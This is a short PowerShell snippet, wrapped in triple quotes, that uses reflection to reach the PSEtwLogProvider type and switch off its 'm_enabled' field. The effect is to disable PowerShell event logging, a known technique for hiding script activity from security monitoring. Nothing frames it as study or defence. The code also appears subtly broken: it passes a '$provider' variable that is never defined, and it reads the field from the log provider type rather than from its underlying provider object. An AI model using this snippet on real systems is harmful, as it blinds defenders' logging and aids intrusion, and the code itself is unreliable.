"""
$type=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$field=$type.GetField('m_enabled','NonPublic,Instance')
$field.SetValue($provider,0)
"""
